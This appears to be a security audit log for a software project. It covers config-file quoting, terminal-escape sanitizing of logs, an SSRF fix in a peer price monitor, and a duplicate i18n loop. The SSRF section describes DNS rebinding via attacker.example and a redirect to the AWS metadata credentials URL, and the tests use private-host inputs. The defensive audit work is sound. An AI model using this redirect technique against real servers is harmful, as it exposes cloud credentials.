For both consumers, prefer single-quoted (works in both readers when value has no apostrophe).

For `parseEnv` consumer when value contains `'`: fall back to double-quoted form. `parseEnv` does NOT expand `$`/`(`/backtick inside double-quoted values (dotenv semantics), so the literal $HOME survives. `parseEnv`'s double-quote handling does NOT support `\"` escape either, so when value contains BOTH `'` AND `"`, the function throws — the case is unrepresentable in parseEnv's env-file format. This is much better than silently corrupting the value; the wizard prompt layer is responsible for rejecting such inputs (cp139-C-21 backlog).

For `bash` consumer when value contains `'`: POSIX close-escape-reopen `'\''` (works in bash, dash, zsh; understood by EnvironmentFile=).

`renderConfig` (writes morphit.config.env) now passes `'parseEnv'` to all 13 `quote()` calls. `renderEnv` and `renderBackupEnv` continue to use the default `'bash'`. `applyUpdates`+`atomicEnvWrite` in edit.ts thread the consumer arg; callers pass `'parseEnv'` for configPath and `'bash'` for envPath.

**Sentinels (8 new + 1 existing updated):**
- `cp139-D-1: $HOME in tagline (parseEnv consumer) is single-quoted` (init-smoke)
- `cp139-D-1: command-substitution $(...) in tagline is single-quoted (parseEnv literal)` (init-smoke)
- `cp139-D-1: embedded apostrophe in tagline falls back to double-quoted (parseEnv consumer)` (init-smoke)
- `cp139-D-1: bare-safe values still emit without quotes` (init-smoke)
- `cp139-D-1: bash consumer (morphit.env critical-infra) stays single-quoted` (init-smoke)
- **`cp139-D-1 round-trip: tagline with apostrophe survives parseEnv read-back`** (init-smoke — the catching sentinel for this exact bug)
- `cp139-D-1 round-trip: tagline with $HOME survives parseEnv read-back as literal` (init-smoke)
- `cp139-D-1 round-trip: every config field round-trips through parseEnv` (init-smoke, 5-field hostile-input matrix)
- `cp139-D-1 negative: value with both ' and " throws at quote() time (unrepresentable in parseEnv)` (init-smoke)
- Plus 7 mirror sentinels in edit-smoke for the parseEnv vs bash consumer paths

All tamper-tested by shipping each variant of the fix progressively and watching the right scenarios fire/pass.

**The smoke battery now contains TAMPER-PROOF parseEnv round-trip invariants** — any future bash-vs-parseEnv divergence in `quote()`/`quoteValue()` is caught instantly by the round-trip sentinels. The catching sentinel was deliberately written to MIRROR the operator's actual workflow: write file → read via the canonical loader → verify the value came out identical.

### cp139-D-2 SHIPPED (LOW, SEC) — operator-config boot-time terminal-escape sanitize

**Where:** `packages/operator-config/src/index.ts` boot-time `console.log` + `throw` sites.

**Issue:** `loadOperatorConfig()` runs at indexer/relay boot, BEFORE any other module. It logs to console:
- `path` (operator-influenceable via `MORPHIT_OPERATOR_CONFIG_FILE` env var, or via systemd unit override),
- offender key names (from a hostile env file with key names containing escape sequences),
- `err.message` from filesystem error.

All three sites pre-cp139-D-2 wrote raw strings to stdout/stderr. A hostile env-file deployment (e.g. supply-chain compromise of a setup script) could plant terminal escapes that fire on every restart.

**Fix:** Inline `sanitizeForTerm()` helper in this package — mirror of `apps/ops-cli/src/render/term.ts:sanitizeForTerm()` but inline so this leaf package has no dependency on the ops-cli render module. Applied at all 6 output sites (5 throw-message interpolations + 4 console.log path interpolations + the skipped-keys join).

The inline duplication is intentional: operator-config is loaded at process boot before module-resolution touches anything else, so introducing a cross-package dep would push instability into the critical path. Sanitize logic is small (~50 LOC) and stable.

### Checkpoint D summary (so far)

**4 of 4 packages walked, 2 findings shipped (D-1 HIGH SEC, D-2 LOW SEC), 0 noted, 0 deferred.**

cp139-D-1 is the standout cp139 finding — HIGH severity because it converts the cp139-C-11 fix from "operator footgun protection" to "data-corruption-by-design." The wizard's emitted morphit.config.env was lossy across the canonical reader for ~24 hours before this audit caught it. Smoke battery now carries the round-trip invariant.

**Checkpoint D close conditions:**

1. ~~Walk operator-config~~ DONE.
2. ~~Walk asset-registry~~ DONE (no I/O surface).
3. ~~Walk indexer-client~~ DONE (pure types).
4. ~~Walk relay-client~~ DONE (pure types).

**Status: COMPLETE.**

---

## Checkpoint E — apps/relay walk (CLOSED 2026-05-25)

### Files walked clean

**ALL 34 source files walked file-by-file** with the same chain-op-handler rigor as cp138-A.  No findings outside cp139-E-1 below:

| Subsystem | Files | LOC |
|---|---|---|
| crypto | `keyEnvelope.ts`, `promptPassphrase.ts` | 271 + 142 |
| config | `unlock.ts` | 122 |
| middleware | `security.ts`, `access_log.ts`, `origin_enforcement.ts`, `ratelimit.ts`, `ip.ts`, `content_type.ts`, `cors.ts` | 79 + 97 + 147 + 219 + 383 + 35 + 35 |
| api | `health.ts`, `availability.ts`, `create.ts`, `invite.ts`, `push.ts` | 179 + 112 + 865 + 326 + 340 |
| policy | `inviteToken.ts`, `altcha.ts`, `name.ts`, `highValueName.ts`, `sequentialDetector.ts`, `clock.ts`, `killSwitch.ts`, `globalDailyCeiling.ts`, `pushSubscriptions.ts`, `pushSubscribeSig.ts` | 259 + 267 + 143 + 463 + 255 + 92 + 129 + 398 + 270 + 210 |
| blurt | `pubkey.ts`, `client.ts` | 28 + 792 |
| queue | `drainer.ts` | 383 |
| log | `index.ts` (→ E-1) | 160 |

The relay code is extraordinarily well-defended.  Almost every file carries historical audit-finding closure markers (N3, N6, N19, N22, N23, MED-009, Audit 2026-05 5-1/5-4/16-B1, Part 26, REVISIT-LIST §G, REVISIT-LIST §F E, REVISIT-LIST §G G1.2, etc.) explaining the rationale.

Notable defensive properties confirmed:
- `keyEnvelope.ts`: scrypt N=2^17 with floor checks on N+r+p (defense in depth against tampered envelopes); GCM tag handling correct; key + plaintext buffer zeroed in finally.
- `promptPassphrase.ts`: raw mode, filters control bytes from typed input, 5-min timeout, distinguishes no_tty/cancelled/timeout/empty.
- `access_log.ts`: privacy-aware — no IP/UA/body logging.  Path is auto-percent-encoded by Node's URL parser, so raw control bytes can't reach `c.req.path`.
- `ip.ts`: trusted-proxy gating (loopback default + operator-extensible CIDR list).  IPv4 /24 + IPv6 /64 canonicalization defeats /64-budget attackers.
- `ratelimit.ts`: pure in-memory (no IP persistence — privacy by design), proper sliding-window, separate peek/commit so legitimate users don't burn quota on no-op lookups.
- `create.ts`: atomic `tryReserve()` defeats the N-1-concurrent-overshoot TOCTOU; try/finally ensures release on every non-success exit; invite peeked not consumed until chain success; composite-key dedupe (Finding N3) doesn't lock users out of retry-with-different-name (Finding N6); dedupe-cleared-on-failure; never echoes raw error to caller.
- `invite.ts`: SYNCHRONOUS pre-reservation between rate-limit check and body-parse await closes the race where concurrent requests could all skip altcha; MAX_DAILY_TRACKED_IPS=100k with oldest-eviction (Finding 16-B1); releaseReservation atomic preserves concurrent-increment work.
- `inviteToken.ts`: signature verified BEFORE JSON-parse (don't trust attacker-controlled bytes for parse); timingSafeEqual + length-check guard; HMAC(secret, ip) for ip_hash defeats IPv4 rainbow tables; consume separate from verify.
- `altcha.ts`: crypto.randomInt (not Math.random — Finding N19 closure); HMAC sig check before salt match; MAX_USED_SALTS=100k oldest-eviction with documented security trade-off.
- `globalDailyCeiling.ts`: tryReserve atomic; releaseReservation idempotent-ish; alertFiredToday single-fire per day; persist file holds ONLY aggregates (zero PII).
- `pushSubscribeSig.ts`: ACTION keyword in canonical message prevents subscribe↔unsubscribe replay; account-name in message prevents cross-account replay; endpoint-hash binds signature to one subscription; ±5min skew check first (cheap).
- `client.ts` (blurt): endpoint rotation with exponential cooldown (2s→10s→60s→5min); transport vs RPC error distinction; last-ditch retry ignoring cooldowns; pure-BigInt VESTS arithmetic (no float).
- `drainer.ts`: defense-in-depth account-name regex + reason regex + amount cap on every queue row before broadcast; broadcast_attempt_at write-before-broadcast closes the double-broadcast window from N23; truncates last_error to 500 chars.

### cp139-E-1 SHIPPED (LOW, SEC) — relay log textSink terminal-escape sanitize

**Where:** `apps/relay/src/log/index.ts:textSink` + `formatValue()`.

**Issue:** `textSink` writes log lines directly to stdout/stderr via `process.stdout.write` / `process.stderr.write`.  `formatValue()` for context-value strings WITHOUT spaces returns the value raw (skips `JSON.stringify` which would have escaped control bytes).  Result: an operator-configurable value (e.g. `persistPath` env var, RPC endpoint URLs) or a chain-RPC error message containing ANSI/CSI escape sequences would inject them straight into the operator's journal/console.

Specific exposure surfaces verified during the walk:
- `policy/globalDailyCeiling.ts:154/175/210` log `path: this.persistPath` — operator-set env var.
- `policy/killSwitch.ts:67/116/121` log `path: this.absolutePath` (derived from operator-set `MORPHIT_RELAY_DATA_DIR`).
- `policy/pushSubscribeSig.ts:170` logs `err: String(err.message)` from chain-RPC error.
- Various places log operator-set bucket keys, endpoint URLs, etc.

Not a high-severity finding (operator-self-imposed via env vars they themselves typed), but a clear bug class worth closing for the same reason the ops-cli C-class was: operator's terminal/journal should be ESC-safe regardless of what arbitrary content reaches it.

**Fix:** Inline `sanitizeForJournal()` helper in `apps/relay/src/log/index.ts` — mirror of `apps/ops-cli/src/render/term.ts:sanitizeForTerm()` but inline (relay log module is the deepest dep root in the relay process; no cross-app import).

Applied at:
- `textSink`: module name, event name, each context key, each error.stack
- `formatValue` (called by textSink): the bare-string emission path (no-space values).  JSON-path values already pass through `JSON.stringify` which natively escapes control bytes (`\x1b` → `\u001b`); sanitize there too as defense-in-depth.

`jsonSink` unchanged — `JSON.stringify` natively escapes control bytes, no separate sanitize needed.

**Sentinels:** New smoke `apps/relay/scripts/log-sanitize-smoke.ts` (13 scenarios):
- 4 scenarios verifying C0/C1/DEL/ANSI-ESC strip from bare-string context value
- 1 scenario verifying SGR escape preserved (legitimate color sequence)
- 1 scenario verifying non-SGR ESC dropped
- 4 scenarios verifying sanitize applied to module + event + context-key + error.stack
- 2 scenarios verifying JSON-path (string-with-space → JSON.stringify) and jsonSink are both clean
- 1 scenario verifying printable ASCII survives intact

Wired into `scripts/run-smokes.sh`.  Tamper-tested by reverting `sanitizeForJournal()` calls in `textSink` + `formatValue` to identity functions: **9 of 13 scenarios fire**.  Restored.

---

## Checkpoint F — apps/indexer log walk (cross-applied)

### cp139-F-1 SHIPPED (LOW, SEC) — indexer log textSink terminal-escape sanitize

**Where:** `apps/indexer/src/log/index.ts:textSink` + `formatValue()`.

**Issue:** Same bug class as cp139-E-1.  Discovered by cross-applying the relay finding hypothesis to the indexer's mirror log module.  The relay + indexer logger contracts are deliberately duplicated (different dep graphs), and the same bare-string emission path exists in both.

**Fix:** Identical `sanitizeForJournal()` inline helper applied at the same call sites (textSink module/event/context-keys/stack; formatValue bare-string path).

**Sentinels:** New smoke `apps/indexer/scripts/log-sanitize-smoke.ts` mirroring the relay smoke (13 scenarios).  Wired into `scripts/run-smokes.sh`.  Tamper-tested identically.

### Why E-1 and F-1 are separate findings

Each app's log module is independently maintained — the comment headers at top of both say "duplication is deliberate; keeping the two apps' internals independent avoids pulling one through the other's dependency graph."  A future divergence in one log module could re-introduce the bug class in just that one.  Reporting them as separate findings ensures both modules carry their own sentinel coverage.

The pattern-match hypothesis (`if relay log has this bug, indexer log probably does too`) is exactly the kind of bug-class sweep the cp139 deep-deep is designed to catch.

---

### cp139-F-2 SHIPPED (MED, SEC) — peerPriceMonitor.fetchPeerReceipt missing SSRF defense

**Where:** `apps/indexer/src/indexer/price/peerPriceMonitor.ts:fetchPeerReceipt()` (pre-fix line 233 — bare `await fetch(url.toString(), ...)`).

**Issue:** `peerPriceMonitor` polls every peer instance every 30 minutes via `fetchPeerReceipt(peerOrigin, ...)`.  The pre-fix implementation called bare `fetch()` directly — **none** of the six SSRF defense layers that `federationProbe.fetchJson()` applies were in place at the fetch site.

Defense gap by layer:

| Layer | federationProbe.fetchJson | peerPriceMonitor (pre-fix) |
|-------|---------------------------|----------------------------|
| 1. HTTPS protocol enforcement | ✓ | ✗ |
| 2. Literal-private-hostname denylist (isPrivateHostname) | ✓ | ✗ |
| 3. DNS resolve + every record validated public | ✓ | ✗ |
| 4. IP-pinned undici dispatcher (TOCTOU defense) | ✓ | ✗ |
| 5. `redirect: 'manual'` | ✓ | ✗ |
| 6. Body cap (256KB) with streaming abort | ✓ | ✗ |

The operator-register handler does enforce a literal-hostname denylist at chain-op intake (see `apps/indexer/src/indexer/handlers/operatorRegister.ts:213-281`, audit finding 5-5).  That intake check catches static-private-hostname attacks (chain-registering `https://127.0.0.1`) — but the comment block at lines 222-231 explicitly notes the intake check is "defense-in-depth; the probe-time check is the authoritative one."

`peerPriceMonitor` was bypassing the authoritative layer.  Real-world exposure:

1. **DNS-rebinding (the layer-3 gap):** an attacker chain-registers `https://attacker.example` (passes intake — public TLD).  At fetch time, attacker controls DNS for `attacker.example` and resolves it to a private IP (or RFC1918, AWS metadata IP, link-local).  `federationProbe`'s next probe cycle catches this and marks the instance `unreachable`/`mismatch`, but **`peerPriceMonitor` would have already fetched against the private IP** — 30-min cadence means probe-vs-monitor races are common.

2. **Redirect-chain (the layer-5 gap):** the attacker's instance returns `302 Location: http://169.254.169.254/latest/meta-data/iam/security-credentials/`.  Pre-fix `fetch()` defaults to `redirect: 'follow'` and would chase the redirect.

3. **Body-bomb (the layer-6 gap):** attacker's instance returns a multi-GB response with `Transfer-Encoding: chunked` or a misreported `Content-Length`.  Pre-fix `await res.json()` would buffer it all.

**Fix:** Export `fetchJson<T>()` from `apps/indexer/src/indexer/federationProbe.ts` (was private to that module) and route `peerPriceMonitor.fetchPeerReceipt` through it.  The fetch site loses bespoke `AbortController` + `setTimeout` plumbing (the canonical 5s timeout inside `fetchJson` is shorter than `PEER_FETCH_TIMEOUT_MS` default 10s, so peers are MORE likely to be skipped on slow responses — strict tradeoff in the "fail closed" direction).

The `timeoutMs` parameter is preserved in the function signature (`void timeoutMs;` to silence unused-arg lint) for API back-compat with smokes that pass it explicitly.  Future enhancement: thread `timeoutMs` through `fetchJson` as an optional override.

**Bug-class sweep done:** every fetch site in `apps/indexer/src/` was catalogued during the find:

| Fetch site | Input source | SSRF risk |
|------------|--------------|-----------|
| federationProbe.ts:612 | known_instances.origin | ✓ Full defense |
| compositeSource.ts:173 | (wrapper invocation) | n/a |
| peerPriceMonitor.ts:233 (pre-fix) | known_instances.origin | ✗ **THIS FINDING** |
| coingeckoFetcher.ts:74 | operator env var | Trust-operator (config-time) |
| klingexFetcher.ts:76 | operator env var | Trust-operator (config-time) |
| moneroProofVerifier.ts:405 | operator config | Trust-operator + HTTPS enforced |
| bitcoinExplorerVerifier.ts:333/438 | operator config | Trust-operator |
| signupAnomalyProbe.ts:74 | operator env var | Loopback by design (relay colocated) |
| feeAmountCalc.ts:81 | hardcoded URL | No attacker input |

cp139-F-2 is the ONLY attacker-input fetch site that was missing defense.

**Sentinels:** Eight new scenarios appended to `apps/indexer/scripts/peer-price-monitor-smoke.ts` (PPM-7-1 through PPM-7-9, totalling 8 new — block names are 1,2,3,4,5,6,7,8,9 with 4,5,6 covering the behavior path and 7,8,9 catching more exotic private forms):

- **PPM-7-1** (source-sentinel): `fetchPeerReceipt` source contains `from '$indexer/federationProbe'` import AND `fetchJson<PeerReceiptResponse>(` call
- **PPM-7-2** (source-sentinel): bare `await fetch(...)` regex no longer matches anywhere in `peerPriceMonitor.ts`
- **PPM-7-3** (source-sentinel): docblock contains `cp139-F-2`, `DNS-rebinding`, `six-layer` markers
- **PPM-7-4**: `fetchPeerReceipt('https://localhost:8443', ...)` → null
- **PPM-7-5**: `fetchPeerReceipt('https://127.0.0.1:8443', ...)` → null
- **PPM-7-6**: `fetchPeerReceipt('https://169.254.169.254', ...)` → null (AWS metadata)
- **PPM-7-7**: `fetchPeerReceipt('http://example.com', ...)` → null (HTTPS enforcement)
- **PPM-7-8**: `fetchPeerReceipt('https://[::1]', ...)` → null (IPv6 loopback)
- **PPM-7-9**: `fetchPeerReceipt('https://printer.local', ...)` → null (.local TLD)

Tamper-tested by reverting `fetchJson<PeerReceiptResponse>(...)` to bare `fetch(...)` and removing the `cp139-F-2`/`DNS-rebinding`/`six-layer` markers from the docblock: **3 of 8 scenarios fire on revert** (PPM-7-1, -7-2, -7-3 — the source sentinels).  PPM-7-4..9 still pass on revert because bare `fetch()` to private hosts returns connection-refused → exception caught → returns null with the same outcome.  The source sentinels are the canonical regression lock; the behavior scenarios document the API contract.

Restored.

**Why MED not HIGH:**
- Intake-time literal-hostname denylist (audit finding 5-5) catches static forms
- Real exploitation requires (a) chain-registering with the canonical signer, (b) controlling DNS for the registered origin, (c) timing DNS flip to peerPriceMonitor's 30-min poll
- DNS-rebinding-as-attack is real but multi-step
- Body-bomb risk is real but bounded by indexer's overall memory/timeouts

**Why ship anyway:** the fix is small and elegant (re-export an existing helper + 2-line consumer change), the design-of-record (single canonical SSRF helper) is cleaner than two parallel implementations, and every future fetch site that touches `known_instances.origin` will inherit the defense automatically by routing through `fetchJson`.


---

## cp139-G-1 — duplicate locale-register loop (LOW, code quality)

**Found while walking apps/web Checkpoint G** (locale + i18n subdir).  Two identical `for (const { code } of SUPPORTED_LOCALES) { register(code, () => import(\`./locales/${code}.json\`)) }` loops appeared at `apps/web/src/lib/i18n/index.ts:38-40` AND `:75-77` — separated by an unrelated `PLANNED_LOCALES` JSDoc block.

**Severity: LOW (code-quality only, not security).**  Both loops registered identical lazy loaders.  svelte-i18n's `register()` is idempotent for the (code, loader) pair — last-write-wins, so behavior is correct.  But:
- Future maintainers reading the file see a duplicate and waste time understanding whether one is intentional
- The second loop's leading comment block is also a duplicate of the first
- Dead code, however benign, is an "audit trail muddiness" hazard

**Fix:** delete the second loop + its leading comment block (the JSDoc between them survives).

**Tamper-tested:** `tsc --noEmit` 0 errors, `svelte-check` 0/0, pulse 18 6076/6076 — the second loop was indeed dead code.

